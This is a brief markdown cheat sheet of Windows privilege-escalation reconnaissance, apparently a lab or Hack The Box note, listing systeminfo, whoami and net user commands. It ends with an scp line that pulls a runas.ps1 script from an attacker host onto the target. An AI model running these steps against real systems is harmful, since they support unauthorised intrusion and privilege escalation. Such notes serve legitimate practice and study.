## Windows privilege Escalation

Get System information

```
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
```

Find username

```
echo %username%
whoami
net users
```

Get information about specific user

```
whoami /all
net user <username>
```

Upload files to server

```
scp 10.10.14.72:/home/hackguru/htb/worker/runas.ps1 .
```